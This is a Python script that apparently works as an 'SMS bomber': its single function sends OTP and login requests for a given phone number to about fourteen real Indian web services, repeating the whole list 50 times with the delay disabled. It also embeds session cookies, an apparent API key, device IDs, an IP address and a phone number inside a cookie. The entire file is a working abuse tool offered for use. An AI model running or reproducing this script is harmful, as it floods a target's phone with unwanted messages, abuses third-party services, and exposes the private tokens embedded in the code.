import requests
import json
import time

def smsgc(number):
    number = str(number)

    # List of APIs with their corresponding URLs and payloads
    apis = [
        
        {
            "url": "https://vyaparapp.in/resend/otp",
            "params": {"email": number, "country_code": "91"},
            "method": "GET"
        },
        {
            "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput",
            "params": {"mobileNumber": number},
            "method": "GET"
        },
        {
            "method": "POST",
            "url": 'https://cst.brevistay.com/app-api/login',
            "headers": {
                'Host': 'cst.brevistay.com',
                'brevi-channel': 'ANDROID',
                'brevi-channel-version': '5.4.1',
                'Content-Type': 'application/json; charset=UTF-8',
                'Accept-Encoding': 'gzip',
                'User-Agent': 'okhttp/4.9.1',
            },
            "data": {
                "is_otp": 1,
                "is_password": 0,
                "mobile": number,
                "otp": 123456,  # You may adjust this value as needed
                "password": ""
            }
        },
        {
            "url": 'https://prod.api.cosmofeed.com/api/user/authenticate',
            "method": "POST",
            "data": {
                'phoneNumber': number,
                'countryCode': '+91',
            },
            "headers": {
                'Host': 'prod.api.cosmofeed.com',
                'Accept': 'application/json, text/plain, */*',
                'Cosmofeed-Request-ID': 'e6491e02-b028-44d2-baba-d19ee35590d0',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Origin': 'https://cosmofeed.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://cosmofeed.com/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": "https://entri.app/api/v3/users/check-phone/",
            "method": "POST",
            "data": {'phone': '+91' + number},
            "headers": {
                'Host': 'entri.app',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Client': 'web',
                'User-Language': 'hi',
                'Content-Type': 'application/json',
                'Origin': 'https://webapp.entri.app',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://webapp.entri.app/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
            "method": "POST",
            "data": {'mobile_number': number},
            "headers": {
                'Host': 'hyuga-auth-service.pratech.live',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Origin': 'https://hyugalife.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://hyugalife.com/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": 'https://m.indiamart.com/ajaxrequest/identified/common/otpVerification',
            "method": "POST",
            "data": {
                'user': number,
                'screenName': 'IMOB EDIT PROFILE',
                'type': 'OTPGEN',
                'authCode': '',
                'glusr_id': '190634360',
                'ciso': 'IN',
                'email': '',
                'user_mobile_country_code': '91',
                'user_country': 'India',
                'userIp': '132.154.59.32',
                'OTPResend': 1,
                'emailVerify': '',
                'source': '',
                'msg_key': 0,
                'attribute_id': '',
                'verifyUser': False,
                'glid': '190634360',
            },
            "headers": {
                'Host': 'm.indiamart.com',
                'Content-Length': '321',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'Origin': 'https://m.indiamart.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://m.indiamart.com/my/profile/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
                'Cookie': '_gcl_au=1.1.1714626412.1702938507; _gid=GA1.2.1681438095.1702938507; _ym_uid=1702938507765800219; _ym_d=1702938507; _ym_isad=2; _ym_visorc=b; ImeshVisitor=fn%3D%7Cln%3D%7Cem%3D%7Cphcc%3D91%7Ciso%3DIN%7Cmb1%3D9336734442%7Cpct%3D0%7Cctid%3D%7Cglid%3D190634360%7Ccd%3D19%2FDEC%2F2023%7Ccmid%3D%7Cutyp%3DN%7Cev%3D%7Cuv%3D%7Custs%3D%7Cadmln%3D0%7Cadmsales%3D0%7Cpwl%3D0%7C; _ga=GA1.2.1079041600.1702938507; random=0=9|1=7|2=1|3=5|4=4|5=8|6=10|7=6; _clck=poqaf0%7C2%7Cfhn%7C0%7C1447; lang=0; gstate=state%3DNational%20Capital%20Territory%20of%20Delhi; iploc=gcniso%3DIN%7Cgcnnm%3DIndia%7Cgctnm%3DDelhi%7Cgctid%3D69514%7Cgacrcy%3D200%7Cgip%3D132.154.59.32%7Cgstate%3DNational%20Capital%20Territory%20of%20Delhi; __gads=ID=d1a7db4c9f93b15a:T=1702938531:RT=1702938531:S=ALNI_MbaFEWfzH9BpL6TagBih6jItTTLIA; __gpi=UID=00000cb4cc592000:T=1702938531:RT=1702938531:S=ALNI_MaKKdEiWkB0--dFLk4XDeuecG-nUg; _clsk=14cce1o%7C1702938542352%7C2%7C0%7Ce.clarity.ms%2Fcollect; _ga_8B5NXMMZN3=GS1.1.1702938507.1.1.1702938562.5.0.0'
            }
        },
        
        {
            "url": f"https://www.jiomart.com/mst/rest/v1/session/initiate/using_mobileno_n_otp?mobile_no={number}",
            "method": "GET",
            "headers": {
                'Host': 'www.jiomart.com',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.jiomart.com/customer/account/login',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": "https://webapi.magicpin.in/ultron-onboarding/merchant/sendOtpWithMessage",
            "method": "POST",
            "data": {
                "phone": number,
                "message": "login",
                "appVersion": 30207
            },
            "headers": {
                "Host": "webapi.magicpin.in",
                "version-code": "30207",
                "version-name": "MAGICPINPARTNER0.7.6",
                "accept-encoding": "gzip",
                "client": "android",
                "content-type": "application/json",
               # "content-length": str(len(json.dumps(data))),
                "user-agent": "okhttp/3.12.12"
            }
        },
        {
            "url": 'https://v2api.medbuzz.in/app/Generate_User_OTP',
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                # Add other headers as needed
            },
            "method": "POST",
            "data": {
                "DeviceID": "10cfa12bd7ccb9b4",
                "ApiKey": "0d064a14-959c-40b5-9089-07629d97bc39",
                "CountryCode": "91",
                "PhoneNumber": number
            }
        },
        {
            "url": 'https://www.beatxp.com/api-build/sendOTP',
            "headers": {
                "Host": "www.beatxp.com",
                "Content-Type": "application/json",
                # Add other headers as needed
            },
            "method": "POST",
            "data": {
                "number": number
            }
        },
        {
            "url": f'https://abmeat.com/client/login/{number}/6436',
            "headers": {
                'Host': 'abmeat.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://abmeat.com/order/ab-meat-mehdipatnam-hyderabad',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-IN,en-US;q=0.9,en;q=0.8',
            },
            "method": "GET",
            "params": {},
            "cookies": {
                'PHPSESSID': '1u68bgu21c9mddmu3vm954600c',
                'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%229236f4b6633be68624660e7fd97539b2%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%22132.154.1.229%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Linux%3B+Android+13%3B+SM-A235F+Build%2FTP1A.220624.014%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrom%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1703254490%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D1dab7d1069b8faa936f67052b7ad55b7',
                'view_outlet': 'Hyderabad',
                'view_business': '6439',
                'slug': 'ab-meat-mehdipatnam-hyderabad',
                'view_locality': 'Mehdipatnam',
                '_ga': 'GA1.1.729356824.1703254492',
                '_ga_RS6GJ805M5': 'GS1.1.1703254499.1.0.1703254499.0.0.0',
                '_ga_X47KM2JJB4': 'GS1.1.1703254491.1.1.1703254500.0.0.0',
            }
        },
        {
            "url": "https://jsso.indiatimes.com/sso/crossapp/identity/web/getLoginOtp",
            "method": "POST",
            "headers": {
                "Host": "jsso.indiatimes.com",
                "content-length": str(len(str(number))),
                "captchatoken": "",
                "csrftoken": "",
                "sdkversion": "0.7.2",
                "user-agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "content-type": "application/json",
                "isjssocrosswalk": "true",
                "channel": "timesprime",
                "platform": "WAP",
                "ssec": "",
                "csut": "",
                "gdpr": "",
                "accept": "*/*",
                "origin": "https://www.timesprime.com",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.timesprime.com/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                "cookie": "deviceid=4qk52ej5h7utmufbjxgvw9dhe; lgc_deviceid=4qk52ej5h7utmufbjxgvw9dhe",
            },
            "data": {
                "mobile": number
            }
        },
        {
            "url": "https://parksmart.in/website/sendLink",
            "method": "POST",
            "headers": {
                "Host": "parksmart.in",
                "Connection": "keep-alive",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "Content-Type": "application/json",
                "Accept": "*/*",
                "Origin": "https://parksmart.in",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            },
            "data": {
                "mobile_number": number
            }
        },
        
    ]
    
    # Run the requests for a specified number of iterations
    for _ in range(50):  # Adjust the range for more iterations
        for api in apis:
            try:
                if api["method"] == "POST":
                    response = requests.post(api["url"], data=json.dumps(api["data"]), headers=api["headers"], timeout=10)
                elif api["method"] == "GET":
                    response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}), timeout=10)
                
                # Print status code and response
                print(f"Request to {api['url']} - Status Code: {response.status_code}")
                print(f"Response: {response.text}")

            except requests.exceptions.RequestException as e:
                print(f"Error during request to {api['url']}: {e}")
        
        # Add a delay of 10 seconds between each request
        #time.sleep(10)

# Example usage:
#smsg("2")  # Replace with the actual phone number you want to use
